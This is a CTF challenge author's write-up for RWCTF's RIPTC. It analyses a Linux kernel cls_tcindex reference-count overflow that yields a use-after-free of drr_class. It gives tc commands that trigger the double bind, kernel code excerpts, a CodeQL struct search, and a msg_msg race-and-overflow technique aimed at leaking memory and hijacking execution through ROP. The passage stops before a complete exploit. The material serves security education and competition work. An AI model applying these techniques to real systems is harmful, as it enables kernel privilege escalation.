# 0x00 Background

One day, I came across the article [Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/), which discusses the cause and exploitation of the [CVE-2023-1829](https://nvd.nist.gov/vuln/detail/CVE-2023-1829). The corresponding [remediation](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8c710f75256bb3cf05ac7b1672c82b92c43f3d28) is to remove the entire `cls_tcindex.c` file. The `net/sched` attack surface has been a hot topic on `kctf/kernelCTF` since last year, sparking widespread attention from the security community towards the security of the Linux kernel. Therefore, using the historical artifact `tcindex` as a starting point, I am looking for other potential security issues that may exist in this file. I dedicate this close-quarters combat experience to the ctfers of RWCTF, and hope you enjoy it.

<!-- more -->

For those who are intrigued by the challenge, you can refer to RIPTC [description](https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/RIPTC) and [attachments](https://github.com/chaitin/Real-World-CTF-6th-Challenges/releases/download/x/riptc_attachment_241a4f7b8921b131e3237af987ad4f82.tar.gz) first. 

# 0x01 Vulnerability

Knowledge about `tcindex` requires a basic understanding of the Linux traffic control framework. You can refer to the [lartc documentation](https://lartc.org/lartc.pdf), the [tc manual](https://man7.org/linux/man-pages/man8/tc.8.html), and the [kernel source code](https://elixir.bootlin.com/linux/latest/source/net/sched). By [referring](https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml) to historical vulnerabilities [CVE-2023-3776](https://nvd.nist.gov/vuln/detail/CVE-2023-3776) and [CVE-2023-4206](https://nvd.nist.gov/vuln/detail/CVE-2023-4206), we can see that common security issues in `net/sched/cls_*.c` are related to the `tcf_bind_filter` call during the change filter process and the handling of `struct tcf_result`.

Upon auditing the [`net/sched/cls_tcindex.c`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/sched/cls_tcindex.c?id=bbe77c14ee6185a61ba6d5e435c1cbb489d2a9ed) file, it is found that each time tcindex is changed, if the original `tcindex_data` has a perfect hash table, a new one will be generated based on the incoming [hash parameter](https://man7.org/linux/man-pages/man8/tc-tcindex.8.html) (representing hash table size), and the original `tcf_result` content will be copied. However, the amount of copying is determined by the minimum value of the incoming hash value and the original hash value. If the incoming hash value is smaller, some of the original `tcf_result` content will be directly discarded:

```c
	if (p->perfect) {
		int i;

		if (tcindex_alloc_perfect_hash(net, cp) < 0)
			goto errout;
		cp->alloc_hash = cp->hash;
		for (i = 0; i < min(cp->hash, p->hash); i++)
			cp->perfect[i].res = p->perfect[i].res;
		balloc = 1;
	}
```

Meanwhile, during the process of releasing the original `tcindex_data`, no additional `tcf_unbind_filter` operation was performed on `cp->perfect[i].res`:

```c
static void tcindex_partial_destroy_work(struct work_struct *work)
{
	struct tcindex_data *p = container_of(to_rcu_work(work),
					      struct tcindex_data,
					      rwork);

	rtnl_lock();
	if (p->perfect)
		tcindex_free_perfect_hash(p);
	kfree(p);
	rtnl_unlock();
}

static void tcindex_free_perfect_hash(struct tcindex_data *cp)
{
	int i;

	for (i = 0; i < cp->hash; i++)
		tcf_exts_destroy(&cp->perfect[i].exts);
	kfree(cp->perfect);
}
```

With the `classid` parameter of tcindex, you can perform the `tcf_bind_filter` operation on a specific `class` multiple times, leading to a mismatch in the number of bind and unbind operations:

```c
	if (tb[TCA_TCINDEX_CLASSID]) {
		cr.classid = nla_get_u32(tb[TCA_TCINDEX_CLASSID]);
		tcf_bind_filter(tp, &cr, base);
	}

	oldp = p;
	r->res = cr;
	tcf_exts_change(&r->exts, &e);

	rcu_assign_pointer(tp->root, cp);
```

Taking the `drr_class` as an example, when a class is bound once, `cl->filter_cnt++` happens. The class address and classid are stored in `p->perfect[i].res`. Due to the change operation on tcindex, the content of `res` is discarded. Repeating the previous steps can cause the reference count `filter_cnt` of the class to increase multiple times. When the last bind causes it to overflow and loop back to 0, the corresponding class is deleted and released, however, there is still a reference to this class in `res`. After triggering `tcindex_classify` with the enqueue packet, it can cause Use After Free on this class.

```c
struct drr_class {
	struct Qdisc_class_common	common;
	unsigned int			filter_cnt;

	struct gnet_stats_basic_sync		bstats;
	struct gnet_stats_queue		qstats;
	struct net_rate_estimator __rcu *rate_est;
	struct list_head		alist;
	struct Qdisc			*qdisc;

	u32				quantum;
	u32				deficit;
};

static int drr_delete_class(struct Qdisc *sch, unsigned long arg,
			    struct netlink_ext_ack *extack)
{
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl = (struct drr_class *)arg;

	if (cl->filter_cnt > 0)
		return -EBUSY;

	sch_tree_lock(sch);

	qdisc_purge_queue(cl->qdisc);
	qdisc_class_hash_remove(&q->clhash, &cl->common);

	sch_tree_unlock(sch);

	drr_destroy_class(sch, cl);
	return 0;
}

static unsigned long drr_bind_tcf(struct Qdisc *sch, unsigned long parent,
				  u32 classid)
{
	struct drr_class *cl = drr_find_class(sch, classid);

	if (cl != NULL)
		cl->filter_cnt++;

	return (unsigned long)cl;
}

static void drr_unbind_tcf(struct Qdisc *sch, unsigned long arg)
{
	struct drr_class *cl = (struct drr_class *)arg;

	cl->filter_cnt--;
}

static const struct Qdisc_class_ops drr_class_ops = {
	.change		= drr_change_class,
	.delete		= drr_delete_class,
	.find		= drr_search_class,
	.tcf_block	= drr_tcf_block,
	.bind_tcf	= drr_bind_tcf,
	.unbind_tcf	= drr_unbind_tcf,
	.graft		= drr_graft_class,
	.leaf		= drr_class_leaf,
	.qlen_notify	= drr_qlen_notify,
	.dump		= drr_dump_class,
	.dump_stats	= drr_dump_class_stats,
	.walk		= drr_walk,
};
```

You might question whether it's possible to bind the same class multiple times, as each filter bind will unbind the previous class. This essentially means that each tcindex filter can only bind the same class once. As for creating a vast number of filters to bind the same class, the kernel memory naturally cannot withstand it:

```c
static inline void
__tcf_bind_filter(struct Qdisc *q, struct tcf_result *r, unsigned long base)
{
	unsigned long cl;

	cl = q->ops->cl_ops->bind_tcf(q, base, r->classid);
	cl = __cls_set_class(&r->class, cl);
	if (cl)
		q->ops->cl_ops->unbind_tcf(q, cl);
}
```

In conclusion, one can compile a [tc](https://github.com/iproute2/iproute2/tree/main/tc) file for local environment use with static compilation, and bind the same drr_class twice:

```
/ # ./tc qdisc add dev lo handle 1 root drr
/ # ./tc class add dev lo parent 1: classid 1:1 drr
/ # ./tc filter add dev lo parent 1: handle 9 prio 1 tcindex hash 16 mask 15 classid 1:1
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
filter parent 1: protocol all pref 1 tcindex chain 0 handle 0x0009 classid 1:1 
/ # ./tc filter replace dev lo parent 1: prio 1 tcindex hash 8 mask 7
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
/ # ./tc filter replace dev lo parent 1: handle 9 prio 1 tcindex hash 16 mask 15 classid 1:1
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
filter parent 1: protocol all pref 1 tcindex chain 0 handle 0x0009 classid 1:1 
/ # ./tc filter replace dev lo parent 1: prio 1 tcindex hash 8 mask 7
/ # ./tc -s filter show dev lo
filter parent 1: protocol all pref 1 tcindex chain 0 
```

```
gef➤  p *(struct drr_class *)arg
$1 = {
  common = {
    classid = 0x10001,
    hnode = {
      next = 0x0 <fixed_percpu_data>,
      pprev = 0xffff8880058142c8
    }
  },
  filter_cnt = 0x2,
```

# 0x02 Environment

If we want to convert this UAF caused by the overflow of the reference count into an actual exploitation scenario, the first thing to consider is the duration of triggering the vulnerability. For example, [CVE-2016-0728](https://web.archive.org/web/20160122103500/http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/), a similar issue, has a shorter triggering path, which took half an hour to run on an Intel Core i7-5500 CPU. [Issue 1423266](https://web.archive.org/web/20160122103500/http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/), a similar path scenario, would take at least an hour to run 20 bits. In my local test, it took 3 minutes to run 20 bits. Considering the duration of exploitation during the competition and the convenience of debugging, I decided to patch the `filter_cnt` of `drr_class` to 16 bits.

```c
struct drr_class {
        struct Qdisc_class_common       common;
        unsigned int                    filter_cnt:16;

        struct gnet_stats_basic_sync            bstats;
        struct gnet_stats_queue         qstats;
        struct net_rate_estimator __rcu *rate_est;
        struct list_head                alist;
        struct Qdisc                    *qdisc;

        u32                             quantum;
        u32                             deficit;
};
```

However, if the patch is directly distributed to the contestants in the form of source code, it will instantly expose the reference count issues introduced by the patch, and instead directly call tcindex to hijack the execution flow, making it impossible to guide everyone to exploit the vulnerabilities mentioned earlier. Therefore, I chose to packet the patch in the form of vmlinux, enhancing the contestants' understanding of the entire kernel environment. Of course, in connection with the discovered vulnerability exploitation scenarios and challenge descriptions, vmlinux can be compiled according to the provided `.config`, quickly bindiffing the patch points:

![](https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/ee2fecafly1hme18lb0kmj21ws0g6gs0.jpg)

As we need to incorporate the deleted `cls_tcindex.c` file, I choose the [6.1.72](https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.1.72.tar.xz) kernel source code here, and introduce the patch in reverse:

```bash
wget https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/patch/?id=b93aeb6352b0229e3c5ca5ca4ff015b015aff33c -O rsvp.patch
patch -p1 -R < rsvp.patch
wget https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/patch/?id=3abebc503a5148072052c229c6b04b329a420ecd -O tcindex.patch
patch -p1 -R < tcindex.patch
wget https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=97e3d26b5e5f371b3ee223d94dd123e6c442ba80 -O CPU-entry-area.patch
patch -p1 < CPU-entry-area.patch
```

Regarding the `.config` file and runtime environment, refer to the relevant [build](https://github.com/google/security-research/blob/master/kernelctf/build_release.sh) and [local run](https://github.com/google/security-research/blob/master/kernelctf/simulator/local_runner.sh) scripts of kernelCTF. For the kernel's security mechanisms, they should be maximally enabled. I have disabled `CONFIG_IO_URING`, `CONFIG_NETFILTER`, `CONFIG_NET_CLS_ACT` (indirectly disabling the [original issue](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis) of CVE-2023-1829) and the redundant `CONFIG_NET_CLS_*`. In addition, I have also disabled [modprobe_path](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md) and [cpu_entry_area](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3776_lts/docs/exploit.md#put-payload-in-fixed-kernel-address-cve-2023-0597) tricks. Lastly, as there are some tc exploit codes available for [reference](https://github.com/star-sg/CVE/blob/master/CVE-2023-1829/src/cls.c), the `time_limit` of [nsjail](https://github.com/google/nsjail) has been adjusted to 120 seconds to test everyone's programming abilities.

# 0x03 Exploitation
## primitive

In abstracting the vulnerability scenario, it is possible to perform UAF on the `drr_class` kmalloc-128 object multiple times. In the context of the kernel code, it is known that there is a primitive for arbitrary address call, [`drr_enqueue`](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_drr.c#L331) -> [`drr_classify`](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_drr.c#L293) obtains the drr_class object after free, that is, the address of the class in the corresponding res specified by `skb->tc_index`:

```c
static int tcindex_classify(struct sk_buff *skb, const struct tcf_proto *tp,
			    struct tcf_result *res)
{
	struct tcindex_data *p = rcu_dereference_bh(tp->root);
	struct tcindex_filter_result *f;
	int key = (skb->tc_index & p->mask) >> p->shift;

	pr_debug("tcindex_classify(skb %p,tp %p,res %p),p %p\n",
		 skb, tp, res, p);

	f = tcindex_lookup(p, key);
	if (!f) {
		struct Qdisc *q = tcf_block_q(tp->chain->block);

		if (!p->fall_through)
			return -1;
		res->classid = TC_H_MAKE(TC_H_MAJ(q->handle), key);
		res->class = 0;
		pr_debug("alg 0x%x\n", res->classid);
		return 0;
	}
	*res = f->res;
	pr_debug("map 0x%x\n", res->classid);

	return tcf_exts_exec(skb, &f->exts, res);
}
```

The subsequent `qdisc_enqueue` will then call `cl->qdisc->enqueue`. As long as the content referenced by `cl`'s two layers is controllable, it is possible to hijack the execution flow to perform ROP:

```c
static int drr_enqueue(struct sk_buff *skb, struct Qdisc *sch,
		       struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	int err = 0;
	bool first;

	cl = drr_classify(skb, sch, &err);
	if (cl == NULL) {
		if (err & __NET_XMIT_BYPASS)
			qdisc_qstats_drop(sch);
		__qdisc_drop(skb, to_free);
		return err;
	}

	first = !cl->qdisc->q.qlen;
	err = qdisc_enqueue(skb, cl->qdisc, to_free);
	if (unlikely(err != NET_XMIT_SUCCESS)) {
		if (net_xmit_drop_count(err)) {
			cl->qstats.drops++;
			qdisc_qstats_drop(sch);
		}
		return err;
	}
```

```c
static inline int qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
				struct sk_buff **to_free)
{
	qdisc_calculate_pkt_len(skb, sch);
	return sch->enqueue(skb, sch, to_free);
}
```

Most write-ups related to kernelCTF and TC do not mention the primitive of `tcf_unbind_filter`. After freeing the drr_class object, there are hardly any directly related primitives in `sch_drr.c`. It still has to be linked with res and only the operation of `tcf_unbind_filter` (reachable through several paths such as delete) is left in `cls_tcindex.c`:

```c
static inline void
__tcf_unbind_filter(struct Qdisc *q, struct tcf_result *r)
{
	unsigned long cl;

	if ((cl = __cls_set_class(&r->class, 0)) != 0)
		q->ops->cl_ops->unbind_tcf(q, cl);
}

static inline void
tcf_unbind_filter(struct tcf_proto *tp, struct tcf_result *r)
{
	struct Qdisc *q = tp->chain->block->q;

	if (!q)
		return;
	__tcf_unbind_filter(q, r);
}
```

```c
static void drr_unbind_tcf(struct Qdisc *sch, unsigned long arg)
{
	struct drr_class *cl = (struct drr_class *)arg;

	cl->filter_cnt--;
}
```

After transitioning through `tcindex_delete` -> `tcf_unbind_filter` -> `drr_unbind_tcf`, the filter_cnt at offset 24 will be decremented by 1:

```
gef➤  ptype /o struct drr_class
/* offset      |    size */  type = struct drr_class {
/*      0      |      24 */    struct Qdisc_class_common {
/*      0      |       4 */        u32 classid;
/* XXX  4-byte hole      */
/*      8      |      16 */        struct hlist_node {
/*      8      |       8 */            struct hlist_node *next;
/*     16      |       8 */            struct hlist_node **pprev;

                                       /* total size (bytes):   16 */
                                   } hnode;

                                   /* total size (bytes):   24 */
                               } common;
/*     24: 0   |       4 */    unsigned int filter_cnt : 16;
/* XXX  6-byte hole      */
/*     32      |      16 */    struct gnet_stats_basic_sync {
/*     32      |       8 */        u64_stats_t bytes;
/*     40      |       8 */        u64_stats_t packets;
/*     48      |       0 */        struct u64_stats_sync {
                                       <no data fields>

                                       /* total size (bytes):    0 */
                                   } syncp;

                                   /* total size (bytes):   16 */
                               } bstats;
/*     48      |      20 */    struct gnet_stats_queue {
/*     48      |       4 */        __u32 qlen;
/*     52      |       4 */        __u32 backlog;
/*     56      |       4 */        __u32 drops;
/*     60      |       4 */        __u32 requeues;
/*     64      |       4 */        __u32 overlimits;

                                   /* total size (bytes):   20 */
                               } qstats;
/* XXX  4-byte hole      */
/*     72      |       8 */    struct net_rate_estimator *rate_est;
/*     80      |      16 */    struct list_head {
/*     80      |       8 */        struct list_head *next;
/*     88      |       8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } alist;
/*     96      |       8 */    struct Qdisc *qdisc;
/*    104      |       4 */    u32 quantum;
/*    108      |       4 */    u32 deficit;

                               /* total size (bytes):  112 */
                             }
```

Since the same class can be bound to different `res` multiple times at the last moment, it is possible to unbind and decrement multiple times after reclaim, modifying key fields in the object, such as the Reference counter and Pointer in a struct considered in [CVE-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#exploitation). However, the [commonly used struct](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/) that fits kmalloc-128, subprocessinfo, is [no longer available](https://www.willsroot.io/2021/10/pbctf-2021-nightclub-writeup-more-fun.html), requiring consideration of other [flexible structs](https://zplin.me/papers/ELOISE.pdf). Alternatively, modifying fields like size to negative values may lead to information leak. Here we use CodeQL, borrowing the writing ideas from [@veritas501](https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/) and [@nccgroup](https://research.nccgroup.com/2023/05/23/offensivecon-2023-exploit-engineering-attacking-the-linux-kernel/), to examine useful fields and structs at offset 24.

```
/**
 * This is an automatically generated file
 * @name Hello world
 * @kind problem
 * @problem.severity warning
 * @id cpp/example/hello-world
 */

 import cpp

 from FunctionCall fc, Function f, Type typ, Field field
 where
   f = fc.getTarget() and
   f.getName().regexpMatch("k[a-z]*alloc") and
   typ = fc.getActualType().(PointerType).getBaseType() and
   field.getDeclaringType() = typ and
   field.getByteOffset() = 24 and
   not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch("arch.*") and 
   not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch("drivers.*") 
 select fc, "In $@, $@ called once $@ with struct $@ filed $@ at offset 24",
 fc,fc.getEnclosingFunction().getFile().getRelativePath(), fc.getEnclosingFunction(),
   fc.getEnclosingFunction().getName().toString(), fc, f.getName(), typ,
   typ.getName(), field, field.getName()
```

We can identify the commonly used [simple_xattr](https://www.starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/#searching-for-kernel-structs) and [msg_msg](https://syst3mfailure.io/wall-of-perdition/) in our exploitation process:

![](https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/ee2fecafly1hme18sa148j219o0aktdl.jpg)

![](https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/ee2fecafly1hme18w73exj219708zgpj.jpg)

## msg_msg overflow

Following the thought process of exploiting information leak by modifying the size field, if it's for simple_xattr, the original size would be compared with the destination buffer size before memcpy. If it is reduced to a negative number, it will definitely return an error directly. Additionally, the getxattr system call also has a [XATTR_SIZE_MAX](https://elixir.bootlin.com/linux/v6.1.72/source/fs/xattr.c#L693) limit for the size of the buffer:

```c
/*
 * xattr GET operation for in-memory/pseudo filesystems
 */
int simple_xattr_get(struct simple_xattrs *xattrs, const char *name,
		     void *buffer, size_t size)
{
	struct simple_xattr *xattr;
	int ret = -ENODATA;

	spin_lock(&xattrs->lock);
	list_for_each_entry(xattr, &xattrs->head, list) {
		if (strcmp(name, xattr->name))
			continue;

		ret = xattr->size;
		if (buffer) {
			if (size < xattr->size)
				ret = -ERANGE;
			else
				memcpy(buffer, xattr->value, xattr->size);
		}
		break;
	}
	spin_unlock(&xattrs->lock);
	return ret;
}
```

For the familiar msg_msg, the same checking logic also exists, after all, it's to prevent any possible overflow:

```c
struct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)
{
	struct msg_msgseg *dst_pseg, *src_pseg;
	size_t len = src->m_ts;
	size_t alen;

	if (src->m_ts > dst->m_ts)
		return ERR_PTR(-EINVAL);

	alen = min(len, DATALEN_MSG);
	memcpy(dst + 1, src + 1, alen);

	for (dst_pseg = dst->next, src_pseg = src->next;
	     src_pseg != NULL;
	     dst_pseg = dst_pseg->next, src_pseg = src_pseg->next) {

		len -= alen;
		alen = min(len, DATALEN_SEG);
		memcpy(dst_pseg + 1, src_pseg + 1, alen);
	}

	dst->m_type = src->m_type;
	dst->m_ts = src->m_ts;

	return dst;
}
```

Assuming you are not following the `MSG_COPY` path, with the `MSG_NOERROR` flag attached, you would eventually enter the store_msg function. The [copy_to_user](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msgutil.c#L156) with overlong [msgsz](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L1034) would fail due to [CONFIG_HARDENED_USERCOPY](https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022). Back to the code snippet of [copy_msg](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msgutil.c#L124), although the check for `src->m_ts` has a hint of TOCTOU, the time window in between is too short to exploit.

So, how can you pass the check `if (src->m_ts > dst->m_ts)`? After taking a shower, I figured it out XD. We can modify to decrement `dst->m_ts` to a negative number. If originally `src->m_ts` is greater than `dst->m_ts`, then after passing the check and [memcpy](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msgutil.c#L128), the larger src msg_msg content is copied to the smaller dst msg_msg content, which can overflow to the object behind dst msg_msg! If this object is still a msg_msg, then overflow modifies its m_ts field, which can smoothly achieve our need to [leak](https://syst3mfailure.io/wall-of-perdition/) according to size.

![](https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/ee2fecafly1hme18zhgf0j20g10c1myb.jpg)

Don't celebrate too soon, where does this dst msg_msg come from? Let's focus on the [do_msgrcv](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L1098) function, which first calls the prepare_copy function to generate a new msg_msg based on MSG_COPY. Note that it will immediately set `copy->m_ts` to the appropriate received bufsz after load_msg is successful:

```c
/*
 * This function creates new kernel message structure, large enough to store
 * bufsz message bytes.
 */
static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)
{
	struct msg_msg *copy;

	/*
	 * Create dummy message to copy real message to.
	 */
	copy = load_msg(buf, bufsz);
	if (!IS_ERR(copy))
		copy->m_ts = bufsz;
	return copy;
}
```

Then, after finding the msg_msg to be rcv with find_msg, the copy_msg function is immediately called, with src being the found msg_msg, and dst being the newly generated msg_msg. Since the `tcf_unbind_filter` operation needs to decrement `dst->m_ts`, there is still a time window from setting m_ts in prepare_copy to judging in copy_msg:

```c
static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,
	       long (*msg_handler)(void __user *, struct msg_msg *, size_t))
{
	int mode;
	struct msg_queue *msq;
	struct ipc_namespace *ns;
	struct msg_msg *msg, *copy = NULL;
	DEFINE_WAKE_Q(wake_q);

	ns = current->nsproxy->ipc_ns;

	if (msqid < 0 || (long) bufsz < 0)
		return -EINVAL;

	if (msgflg & MSG_COPY) {
		if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))                // [3]
			return -EINVAL;
		copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));
		if (IS_ERR(copy))
			return PTR_ERR(copy);
	}
	mode = convert_mode(&msgtyp, msgflg);

	rcu_read_lock();
	msq = msq_obtain_object_check(ns, msqid);
	if (IS_ERR(msq)) {
		rcu_read_unlock();
		free_copy(copy);
		return PTR_ERR(msq);
	}

	for (;;) {
		struct msg_receiver msr_d;

		msg = ERR_PTR(-EACCES);
		if (ipcperms(ns, &msq->q_perm, S_IRUGO))
			goto out_unlock1;

		ipc_lock_object(&msq->q_perm);                                      // [4]

		/* raced with RMID? */
		if (!ipc_valid_object(&msq->q_perm)) {
			msg = ERR_PTR(-EIDRM);
			goto out_unlock0;
		}

		msg = find_msg(msq, &msgtyp, mode);                                 // [5]
		if (!IS_ERR(msg)) {
			/*
			 * Found a suitable message.
			 * Unlink it from the queue.
			 */
			if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {
				msg = ERR_PTR(-E2BIG);
				goto out_unlock0;
			}
			/*
			 * If we are copying, then do not unlink message and do
			 * not update queue parameters.
			 */
			if (msgflg & MSG_COPY) {
				msg = copy_msg(msg, copy);
				goto out_unlock0;
			}

			list_del(&msg->m_list);
			msq->q_qnum--;
			msq->q_rtime = ktime_get_real_seconds();
			ipc_update_pid(&msq->q_lrpid, task_tgid(current));
			msq->q_cbytes -= msg->m_ts;
			percpu_counter_sub_local(&ns->percpu_msg_bytes, msg->m_ts);
			percpu_counter_sub_local(&ns->percpu_msg_hdrs, 1);
			ss_wakeup(msq, &wake_q, false);

			goto out_unlock0;
		}

		/* No message waiting. Wait for a message */
		if (msgflg & IPC_NOWAIT) {                                          // [1]
			msg = ERR_PTR(-ENOMSG);
			goto out_unlock0;
		}

		list_add_tail(&msr_d.r_list, &msq->q_receivers);
		msr_d.r_tsk = current;
		msr_d.r_msgtype = msgtyp;
		msr_d.r_mode = mode;
		if (msgflg & MSG_NOERROR)
			msr_d.r_maxsize = INT_MAX;
		else
			msr_d.r_maxsize = bufsz;

		/* memory barrier not require due to ipc_lock_object() */
		WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN));

		/* memory barrier not required, we own ipc_lock_object() */
		__set_current_state(TASK_INTERRUPTIBLE);

		ipc_unlock_object(&msq->q_perm);
		rcu_read_unlock();
		schedule();                                                         // [2]

		/*
		 * Lockless receive, part 1:
		 * We don't hold a reference to the queue and getting a
		 * reference would defeat the idea of a lockless operation,
		 * thus the code relies on rcu to guarantee the existence of
		 * msq:
		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.
		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.
		 */
		rcu_read_lock();

		/*
		 * Lockless receive, part 2:
		 * The work in pipelined_send() and expunge_all():
		 * - Set pointer to message
		 * - Queue the receiver task for later wakeup
		 * - Wake up the process after the lock is dropped.
		 *
		 * Should the process wake up before this wakeup (due to a
		 * signal) it will either see the message and continue ...
		 */
		msg = READ_ONCE(msr_d.r_msg);
		if (msg != ERR_PTR(-EAGAIN)) {
			/* see MSG_BARRIER for purpose/pairing */
			smp_acquire__after_ctrl_dep();

			goto out_unlock1;
		}

		 /*
		  * ... or see -EAGAIN, acquire the lock to check the message
		  * again.
		  */
		ipc_lock_object(&msq->q_perm);

		msg = READ_ONCE(msr_d.r_msg);
		if (msg != ERR_PTR(-EAGAIN))
			goto out_unlock0;

		list_del(&msr_d.r_list);
		if (signal_pending(current)) {
			msg = ERR_PTR(-ERESTARTNOHAND);
			goto out_unlock0;
		}

		ipc_unlock_object(&msq->q_perm);
	}

out_unlock0:
	ipc_unlock_object(&msq->q_perm);
	wake_up_q(&wake_q);
out_unlock1:
	rcu_read_unlock();
	if (IS_ERR(msg)) {
		free_copy(copy);
		return PTR_ERR(msg);
	}

	bufsz = msg_handler(buf, msg, bufsz);
	free_msg(msg);

	return bufsz;
}
```

Looking at the code of do_msgrcv, to expand this time window:

1. First, you can set the IPC_NOWAIT flag \[1\]. If there is no corresponding msg_msg in the msg queue, it will enter the schedule \[2\]. However, IPC_NOWAIT cannot be set at the same time as MSG_COPY \[3\], so this road is blocked.
2. Taking a cue from [@Jann Horn](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf)'s race condition idea, at the ipc_lock_object \[4\] point, use [msgctl_stat](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L554) to compete for the spinlock. However, the related system calls all have time consumption when entering the system call and copy_to_user, and the overall effect is not good.
3. By auditing the code line by line, I found that find_msg \[5\] has an interesting loop. If MSG_COPY is set, the [search mode](https://elixir.bootlin.com/linux/v6.1.72/source/ipc/msg.c#L1004) is set to SEARCH_NUMBER, that is, the more msg_msg in our msg_queue, the more times we can loop for search.

```c
static struct msg_msg *find_msg(struct msg_queue *msq, long *msgtyp, int mode)
{
	struct msg_msg *msg, *found = NULL;
	long count = 0;

	list_for_each_entry(msg, &msq->q_messages, m_list) {
		if (testmsg(msg, *msgtyp, mode) &&
		    !security_msg_queue_msgrcv(&msq->q_perm, msg, current,
					       *msgtyp, mode)) {
			if (mode == SEARCH_LESSEQUAL && msg->m_type != 1) {
				*msgtyp = msg->m_type - 1;
				found = msg;
			} else if (mode == SEARCH_NUMBER) {
				if (*msgtyp == count)
					return msg;
			} else
				return msg;
			count++;
		}
	}

	return found ?: ERR_PTR(-EAGAIN);
}
```

Similarly, in `tcindex_destroy`, there is also a loop that performs the `tcf_unbind_filter` decrement operation:

```c
static void tcindex_destroy(struct tcf_proto *tp, bool rtnl_held,
			    struct netlink_ext_ack *extack)
{
	struct tcindex_data *p = rtnl_dereference(tp->root);
	int i;

	pr_debug("tcindex_destroy(tp %p),p %p\n", tp, p);

	if (p->perfect) {
		for (i = 0; i < p->hash; i++) {
			struct tcindex_filter_result *r = p->perfect + i;

			/* tcf_queue_work() does not guarantee the ordering we
			 * want, so we have to take this refcnt temporarily to
			 * ensure 'p' is freed after all tcindex_filter_result
			 * here. Imperfect hash does not need this, because it
			 * uses linked lists rather than an array.
			 */
			tcindex_data_get(p);

			tcf_unbind_filter(tp, &r->res);
			if (tcf_exts_get_net(&r->exts))
				tcf_queue_work(&r->rwork,
					       tcindex_destroy_rexts_work);
			else
				__tcindex_destroy_rexts(r);
		}
	}

	for (i = 0; p->h && i < p->hash; i++) {
		struct tcindex_filter *f, *next;
		bool last;

		for (f = rtnl_dereference(p->h[i]); f; f = next) {
			next = rtnl_dereference(f->next);
			tcindex_delete(tp, &f->result, &last, rtnl_held, NULL);
		}
	}

	tcf_queue_work(&p->rwork, tcindex_destroy_work);
}
```

Since the header of msg_msg occupies 0x30 bytes, the content of msg_msg must be greater than 0x30 to be allocated to kmalloc-cg-128. For example, a size of 0x40 only needs 0x41 times of unbind to make `dst->m_ts` negative. Set the loop of find_msg to 0x2000 or even larger, this can easily complete this condition race and overflow the adjacent msg_msg:

